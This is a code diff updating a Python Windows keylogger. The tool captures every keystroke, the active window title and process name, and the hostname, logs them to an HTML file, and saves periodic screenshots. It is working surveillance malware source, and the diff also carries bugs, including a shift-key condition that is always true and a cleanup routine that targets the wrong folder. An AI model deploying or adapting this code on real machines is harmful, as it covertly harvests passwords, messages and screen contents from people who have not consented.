@@ -1,11 +1,19 @@
 import datetime
 import os
+import shutil
+import atexit
 import psutil
 import win32gui
 import win32process
 from pynput import keyboard
 from PIL import ImageGrab
 from unidecode import unidecode
+import socket
+import re
+
+
+# Get the computer name
+computer_name = socket.gethostname()
 
 # Get the current directory
 current_dir = os.getcwd()
@@ -28,7 +36,7 @@ log_file.write('<html>\n<head>\n<meta charset="utf-8">\n<title>Keystrokes Log</t
 # This function gets called every time a key is pressed
 def on_press(key):
     global current_window_title, current_process_name, last_screenshot_time
-    try:
+    try:    
         # Get the title and process name of the foreground window
         window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
         pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
@@ -48,16 +56,16 @@ def on_press(key):
             # Handle special keys
             if key == keyboard.Key.space:
                 key_char = " "
+            #You could replace the other elif key with this one below if you want. I just made it like this so that I could read it easily.
+            # ("Key")>0 
+            
+
             elif key == keyboard.Key.enter:
                 key_char = "[Enter]"
             elif key == keyboard.Key.tab:
                 key_char = "[Tab]"
             elif key == keyboard.Key.backspace:
                 key_char = "[Backspace]"
-            elif key == keyboard.Key.shift_l:
-                key_char = ""
-            elif key == keyboard.Key.shift_r:
-                key_char = ""
             elif key == keyboard.Key.alt_l:
                 key_char = "[L Alt]"
             elif key == keyboard.Key.alt_r:
@@ -74,21 +82,28 @@ def on_press(key):
                 key_char = "[Up]"
             elif key ==  keyboard.Key.down:
                 key_char = "[Down]"
+            elif key == keyboard.Key.shift_l or keyboard.Key.shift_r or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+                key_char = ""
+            elif key.ctrl or key.alt:
+                key_char = key.name.lower()
             else:
                 # Handle normal keys
                 if hasattr(key, 'char'):
                     key_char = key.char
                 else: # So this part and below fixes the charmap problem in the logs while the other fixes the console one.
-                    key_char = str(key)
+                    key_char = str(key) # Another update, this didn't really resolve the issue.
                 if key_char == '\u25cf':
                     key_char = ''
+                else:
+                    key_char = f"[{key_char}]"
         else:
             key_char = str(key.char)
             if keyboard.Controller().shift_pressed:
                 key_char = key_char.upper()
-        key_char = unidecode(key_char)
         
         # Encode the output to utf-8
+        key_char = unidecode(key_char)
+        key_char = re.sub(r'[^\x20-\x7E]+', '', key_char)
         log_file.write(key_char.encode("utf-8").decode())
         #log_file.write(f'<p class="key-pressed">{key_char.encode("utf-8").decode()}</p>')
 
@@ -96,10 +111,11 @@ def on_press(key):
         log_file.flush()
 
         # Take a screenshot if it's time
-        if (datetime.datetime.now() - last_screenshot_time).seconds >= screenshot_interval:
+        if (datetime.datetime.now() - last_screenshot_time) >= datetime.timedelta(seconds=screenshot_interval):
             screenshot = ImageGrab.grab()
             screenshot.save(os.path.join(current_dir, f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"))
             last_screenshot_time = datetime.datetime.now()
+
 
 
     except Exception as e:
@@ -115,3 +131,12 @@ with keyboard.Listener(on_press=on_press) as listener:
 
 # Close the log file when we're done. I only did this because it's just a testing (Remove this part if you want to).
 log_file.close() 
+# Remove all screenshots
+def cleanup():
+    screenshots_dir = os.path.join(current_dir, "screenshot")
+    if os.path.exists(screenshots_dir):
+        shutil.rmtree(screenshots_dir)
+
+# Register the cleanup function to be called on exit
+atexit.register(cleanup)
+
